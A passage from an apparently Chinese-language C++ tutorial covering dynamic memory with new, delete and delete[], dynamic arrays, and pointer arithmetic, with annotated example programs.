class="comment">// 或者在声明时分配</span></span><br><span class="line">typeName * pointerVariable = <span class="keyword">new</span> typeName;</span><br><span class="line"><span class="comment">// 也可以带初始化器</span></span><br><span class="line">typeName * pointerVariable = <span class="keyword">new</span> typeName (initializer); <span class="comment">// C++98/03</span></span><br><span class="line">typeName * pointerVariable = <span class="keyword">new</span> typeName &#123;initializer&#125;; <span class="comment">// C++11 列表初始化</span></span><br></pre></td></tr></table></figure><ul><li>  <code>new</code>: 运算符。</li><li>  <code>typeName</code>: 要分配内存的数据类型。</li><li>  <code>initializer</code> (可选): 用于初始化新分配内存的值。</li></ul><p><strong>工作流程:</strong></p><ol><li> <code>new</code> 在自由存储区找到一块足够大的、未使用的内存块，以存储 <code>typeName</code> 类型的数据。</li><li> <code>new</code> 返回这块内存的<strong>起始地址</strong>。</li><li> 这个地址被赋给一个相应类型的指针变量。</li></ol><p><strong>如果 <code>new</code> 无法分配所需的内存（例如内存不足），它会抛出一个 <code>std::bad_alloc</code> 异常</strong>（除非使用了 <code>new (std::nothrow)</code> 版本，该版本在失败时返回 <code>nullptr</code>）。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;new&gt; // 为了 std::bad_alloc (虽然不一定需要显式包含) 和 std::nothrow</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 分配一个 int 的内存</span></span><br><span class="line">    <span class="keyword">int</span> * p_int = <span class="keyword">new</span> <span class="keyword">int</span>; <span class="comment">// 在自由存储区分配一个 int 大小的内存</span></span><br><span class="line">    <span class="keyword">if</span> (p_int == <span class="literal">nullptr</span>) &#123; <span class="comment">// 理论检查 (对于普通 new，失败会抛异常)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Memory allocation failed!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *p_int = <span class="number">101</span>; <span class="comment">// 通过指针访问并赋值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配一个 double 并初始化</span></span><br><span class="line">    <span class="keyword">double</span> * p_double = <span class="keyword">new</span> <span class="keyword">double</span> (<span class="number">99.99</span>); <span class="comment">// 分配并初始化为 99.99</span></span><br><span class="line">    <span class="comment">// 或者 C++11 列表初始化</span></span><br><span class="line">    <span class="comment">// double * p_double = new double &#123;99.99&#125;; </span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamically allocated int: &quot;</span> &lt;&lt; *p_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamically allocated double: &quot;</span> &lt;&lt; *p_double &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of int: &quot;</span> &lt;&lt; p_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of double: &quot;</span> &lt;&lt; p_double &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 内存释放将在下一节讲解 ---</span></span><br><span class="line">    <span class="comment">// delete p_int; </span></span><br><span class="line">    <span class="comment">// delete p_double;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 nothrow 版本 (失败时返回 nullptr)</span></span><br><span class="line">    <span class="keyword">int</span> * p_lots_of_ints = <span class="keyword">new</span> (<span class="built_in">std</span>::nothrow) <span class="keyword">int</span>[<span class="number">1000000000</span>]; <span class="comment">// 尝试分配巨大数组</span></span><br><span class="line">    <span class="keyword">if</span> (p_lots_of_ints == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Huge memory allocation failed, but program continues.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Huge memory allocation succeeded (unlikely).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">// delete[] p_lots_of_ints; // 如果成功，需要释放</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态分配的内存<strong>不会</strong>像自动变量那样在作用域结束时自动释放。程序员必须负责在不再需要时手动释放它。</p><h3 id="4-7-5-使用delete释放内存"><a href="#4-7-5-使用delete释放内存" class="headerlink" title="4.7.5 使用delete释放内存"></a>4.7.5 使用delete释放内存</h3><p><code>delete</code> 运算符用于释放由 <code>new</code> 分配的内存，将其归还给自由存储区，以便后续可以重新分配使用。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> pointerVariable; </span><br></pre></td></tr></table></figure><ul><li>  <code>delete</code>: 运算符。</li><li>  <code>pointerVariable</code>: 指向由 <code>new</code>（**不是 <code>new[]</code>**）分配的内存的指针。</li></ul><p><strong>工作流程:</strong></p><ol><li> <code>delete</code> 接收一个指针，该指针必须指向由 <code>new</code> 分配的内存块的起始地址。</li><li> <code>delete</code> 释放该指针指向的内存块。</li><li> 指针变量本身的值<strong>不会</strong>被自动修改（它仍然存储着那个现在无效的地址），成为**悬挂指针 (Dangling Pointer)**。</li></ol><p><strong>重要规则:</strong></p><ul><li>  <strong><code>new</code> 和 <code>delete</code> 必须配对使用:</strong> 每个 <code>new</code> 都应该对应一个 <code>delete</code>。</li><li>  <strong>不要 <code>delete</code> 同一块内存两次:</strong> 对同一块内存执行两次 <code>delete</code> 是未定义行为。</li><li>  <strong>不要 <code>delete</code> 不是由 <code>new</code> 分配的内存:</strong> 例如，不要 <code>delete</code> 指向自动变量（栈变量）或静态变量的指针。</li><li>  <strong>不要 <code>delete</code> 空指针 (<code>nullptr</code>):</strong> 对空指针执行 <code>delete</code> 是安全且无效果的。</li><li>  <strong><code>delete</code> 之后将指针设为 <code>nullptr</code>:</strong> 释放内存后，最好立即将指针设置为 <code>nullptr</code>，以防止它成为悬挂指针被意外使用。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 分配内存</span></span><br><span class="line">    <span class="keyword">int</span> * p_value = <span class="keyword">new</span> <span class="keyword">int</span> (<span class="number">42</span>);</span><br><span class="line">    <span class="keyword">double</span> * p_temp = <span class="keyword">new</span> <span class="keyword">double</span>;</span><br><span class="line">    *p_temp = <span class="number">123.45</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before delete:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; p_value points to: &quot;</span> &lt;&lt; *p_value &lt;&lt; <span class="string">&quot; at address &quot;</span> &lt;&lt; p_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; p_temp points to: &quot;</span> &lt;&lt; *p_temp &lt;&lt; <span class="string">&quot; at address &quot;</span> &lt;&lt; p_temp &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 释放内存</span></span><br><span class="line">    <span class="keyword">delete</span> p_value; </span><br><span class="line">    <span class="keyword">delete</span> p_temp;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAfter delete:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// p_value 和 p_temp 现在是悬挂指针!</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; p_value still holds address: &quot;</span> &lt;&lt; p_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot; Accessing *p_value: &quot; &lt;&lt; *p_value &lt;&lt; std::endl; // 危险! 未定义行为</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 将指针设为 nullptr (好习惯)</span></span><br><span class="line">    p_value = <span class="literal">nullptr</span>;</span><br><span class="line">    p_temp = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After setting to nullptr:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; p_value holds: &quot;</span> &lt;&lt; p_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0 或类似表示空指针的值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对 nullptr 调用 delete 是安全的</span></span><br><span class="line">    <span class="keyword">delete</span> p_value; <span class="comment">// 无效果</span></span><br><span class="line">    <span class="keyword">delete</span> p_temp; <span class="comment">// 无效果</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误示例:</span></span><br><span class="line">    <span class="keyword">int</span> stack_var = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> * p_stack = &amp;stack_var;</span><br><span class="line">    <span class="comment">// delete p_stack; // 严重错误! 不能 delete 栈内存</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> * p1 = <span class="keyword">new</span> <span class="keyword">int</span>;</span><br><span class="line">    <span class="keyword">int</span> * p2 = p1; <span class="comment">// p1 和 p2 指向同一块内存</span></span><br><span class="line">    <span class="keyword">delete</span> p1;</span><br><span class="line">    <span class="comment">// delete p2; // 严重错误! 删除了同一块内存两次</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>忘记 <code>delete</code> 会导致内存泄漏，而错误地使用 <code>delete</code> 则可能导致程序崩溃或数据损坏。正确管理动态内存是 C++ 编程中的一项重要技能。</p><h3 id="4-7-6-使用new来创建动态数组"><a href="#4-7-6-使用new来创建动态数组" class="headerlink" title="4.7.6 使用new来创建动态数组"></a>4.7.6 使用new来创建动态数组</h3><p>除了分配单个变量的内存，<code>new</code> 也可以用来动态分配<strong>数组</strong>。这在你需要在运行时确定数组大小时非常有用。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pointerVariable = <span class="keyword">new</span> typeName [numberOfElements];</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">typeName * pointerVariable = <span class="keyword">new</span> typeName [numberOfElements];</span><br></pre></td></tr></table></figure><ul><li>  <code>new</code>: 运算符。</li><li>  <code>typeName</code>: 数组元素的数据类型。</li><li>  <code>numberOfElements</code>: 数组的大小，可以是一个变量或表达式，在运行时计算其值。</li><li>  <code>[]</code>: 表明要分配的是一个数组。</li></ul><p><code>new[]</code> 会分配一块连续的内存，足以容纳 <code>numberOfElements</code> 个 <code>typeName</code> 类型的元素，并返回指向<strong>数组第一个元素</strong>的指针。</p><p><strong>释放动态数组 (<code>delete[]</code>):</strong></p><p>释放由 <code>new[]</code> 分配的数组内存<strong>必须</strong>使用 <code>delete[]</code> 运算符，而不是 <code>delete</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> [] pointerVariable;</span><br></pre></td></tr></table></figure><ul><li>  <code>delete[]</code>: 用于释放数组内存的运算符。</li><li>  <code>pointerVariable</code>: 指向由 <code>new[]</code> 分配的数组内存的指针。</li></ul><p><strong><code>delete[]</code> 和 <code>delete</code> 的区别至关重要:</strong></p><ul><li>  <code>delete[]</code> 知道需要释放的是一个数组，它会正确地调用数组中每个对象（如果是类类型）的析构函数（如果需要），并释放整个数组占用的内存。</li><li>  如果对 <code>new[]</code> 分配的内存使用 <code>delete</code>（没有 <code>[]</code>），行为是<strong>未定义的</strong>。对于基本类型可能看似正常工作（但仍是错误的），但对于包含对象的数组，很可能只调用第一个对象的析构函数，并可能导致内存损坏或泄漏。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the size of the dynamic array: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid size.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 使用 new[] 分配动态数组</span></span><br><span class="line">    <span class="keyword">int</span> * dynArray = <span class="keyword">new</span> <span class="keyword">int</span>[size]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查分配是否成功 (可选，对于普通 new[] 失败会抛异常)</span></span><br><span class="line">    <span class="keyword">if</span> (dynArray == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Memory allocation failed!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 像普通数组一样使用指针访问动态数组元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        dynArray[i] = i * <span class="number">10</span>; <span class="comment">// 使用数组下标访问</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic array elements:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; dynArray[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] = &quot;</span> &lt;&lt; *(dynArray + i) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 也可以使用指针算术访问</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 使用 delete[] 释放动态数组内存</span></span><br><span class="line">    <span class="keyword">delete</span> [] dynArray;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 将指针设为 nullptr (好习惯)</span></span><br><span class="line">    dynArray = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic array deleted.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误示例:</span></span><br><span class="line">    <span class="keyword">double</span> * p_arr = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">10</span>];</span><br><span class="line">    <span class="comment">// delete p_arr; // 错误! 应该使用 delete [] p_arr;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结:</strong></p><ul><li>  使用 <code>new typeName[size]</code> 分配动态数组。</li><li>  使用 <code>delete [] pointerVariable</code> 释放动态数组。</li><li>  <strong>必须</strong>匹配 <code>new[]</code> 和 <code>delete[]</code>，否则行为未定义。</li><li>  动态数组提供了在运行时确定数组大小的灵活性，但需要程序员负责内存管理。</li></ul><h2 id="4-8-指针、数组和指针算术"><a href="#4-8-指针、数组和指针算术" class="headerlink" title="4.8 指针、数组和指针算术"></a>4.8 指针、数组和指针算术</h2><p>指针和数组在 C++ 中有着非常紧密的联系。理解这种关系以及指针算术对于有效地使用 C++ 处理内存和数据集合至关重要。</p><h3 id="4-8-1-程序说明"><a href="#4-8-1-程序说明" class="headerlink" title="4.8.1 程序说明"></a>4.8.1 程序说明</h3><p>指针算术允许我们对指针执行一些特殊的算术运算，主要是加法和减法，以便在内存中移动，特别是在数组中。</p><p><strong>指针与数组名的关系:</strong></p><p>在 C++ 中，数组名在很多情况下会被隐式地当作指向其<strong>第一个元素</strong>的指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> wages[<span class="number">3</span>] = &#123;<span class="number">1000.0</span>, <span class="number">2000.0</span>, <span class="number">3000.0</span>&#125;;</span><br><span class="line">    <span class="keyword">double</span> *p_wages = wages; <span class="comment">// 数组名 wages 被当作指向第一个元素的指针 (&amp;wages[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of first element (&amp;wages[0]): &quot;</span> &lt;&lt; &amp;wages[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of array name (wages):        &quot;</span> &lt;&lt; wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出与 &amp;wages[0] 相同</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of pointer (p_wages):         &quot;</span> &lt;&lt; p_wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出与 &amp;wages[0] 相同</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过指针访问数组元素</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First element via pointer (*p_wages): &quot;</span> &lt;&lt; *p_wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1000.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指针算术: 将指针移动到下一个元素</span></span><br><span class="line">    p_wages = p_wages + <span class="number">1</span>; <span class="comment">// 指针加 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address after p_wages + 1:          &quot;</span> &lt;&lt; p_wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 指向 wages[1] 的地址</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value at *(p_wages + 1) (now *p_wages): &quot;</span> &lt;&lt; *p_wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2000.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用数组下标访问 (即使是通过指针)</span></span><br><span class="line">    p_wages = wages; <span class="comment">// 重置指针指向第一个元素</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Accessing via pointer subscript p_wages[1]: &quot;</span> &lt;&lt; p_wages[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2000.0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Accessing via array name subscript wages[1]: &quot;</span> &lt;&lt; wages[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2000.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数组名和指针的区别:</span></span><br><span class="line">    <span class="comment">// 1. sizeof: sizeof(wages) 是整个数组的大小 (3 * sizeof(double))</span></span><br><span class="line">    <span class="comment">//            sizeof(p_wages) 是指针本身的大小 (通常 4 或 8 字节)</span></span><br><span class="line">    <span class="comment">// 2. 地址: &amp;wages 是整个数组的地址 (类型是 double(*)[3])</span></span><br><span class="line">    <span class="comment">//         &amp;p_wages 是指针变量 p_wages 自身的地址</span></span><br><span class="line">    <span class="comment">// 3. 修改: 数组名 wages 是常量，不能修改 (不能 wages = wages + 1;)</span></span><br><span class="line">    <span class="comment">//         指针 p_wages 是变量，可以修改指向其他地址 (p_wages = p_wages + 1;)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sizeof(wages): &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(wages) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sizeof(p_wages): &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(p_wages) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>指针算术规则:</strong></p><ul><li>  <strong>指针加整数 <code>p + n</code>:</strong> 结果是一个指向 <code>p</code> 原来指向位置之后第 <code>n</code> 个<strong>元素</strong>的地址。编译器会根据指针指向的类型大小自动计算实际地址偏移量（<code>地址 = p的地址 + n * sizeof(指向的类型)</code>）。</li><li>  <strong>指针减整数 <code>p - n</code>:</strong> 结果是一个指向 <code>p</code> 原来指向位置之前第 <code>n</code> 个元素的地址。</li><li>  <strong>指针减指针 <code>p1 - p2</code>:</strong> 结果是两个指针之间相隔的<strong>元素数量</strong>（一个整数）。只有当两个指针指向<strong>同一个数组</strong>（或超出末尾一个位置）中的元素时，这个操作才有意义。结果的类型是 <code>std::ptrdiff_t</code> (在 <code>&lt;cstddef&gt;</code> 中定义)。</li><li>  <strong>递增/递减:</strong> <code>++p</code>, <code>p++</code>, <code>--p</code>, <code>p--</code> 分别使指针指向下一个或上一个元素。</li><li>  <strong>比较:</strong> 可以使用关系运算符 (<code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>) 比较指向<strong>同一个数组</strong>元素的指针，判断它们的相对位置。也可以使用 <code>==</code> 和 <code>!=</code> 比较指针是否指向同一个地址（或是否都为空）。</li></ul><p><strong>数组下标和指针的关系:</strong></p><p>表达式 <code>arrayName[i]</code> 在 C++ 中等价于 <code>*(arrayName + i)</code>。<br>同样，如果 <code>p</code> 是一个指向数组元素的指针，<code>p[i]</code> 等价于 <code>*(p + i)</code>。</p><p>这意味着你可以对数组名使用指针算术（概念上），也可以对指针使用数组下标表示法。</p><h3 id="4-8-2-指针小结"><a href="#4-8-2-指针小结" class="headerlink" title="4.8.2 指针小结"></a>4.8.2 指针小结</h3><p>让我们回顾一下关于指针的关键概念：</p><ol><li> <strong>声明:</strong> 使用 <code>typeName * pointerName;</code> 声明一个指向 <code>typeName</code> 类型数据的指针。</li><li><strong>初始化:</strong><ul><li>  使用 <code>&amp;</code> 获取变量地址: <code>pointerName = &amp;variableName;</code></li><li>  初始化为空指针: <code>pointerName = nullptr;</code> (C++11) 或 <code>pointerName = 0;</code></li><li>  使用 <code>new</code> 分配动态内存: <code>pointerName = new typeName;</code> 或 <code>pointerName = new typeName[size];</code></li></ul></li><li> <strong>解引用:</strong> 使用 <code>*</code> 访问指针指向的值: <code>value = *pointerName;</code> 或 <code>*pointerName = newValue;</code>。</li><li> <strong>指针与数组:</strong> 数组名通常可视为指向第一个元素的常量指针。指针算术允许在数组元素间移动。<code>array[i]</code> 等价于 <code>*(array + i)</code>。</li><li> <strong>动态内存:</strong> 使用 <code>new</code> 分配，必须使用 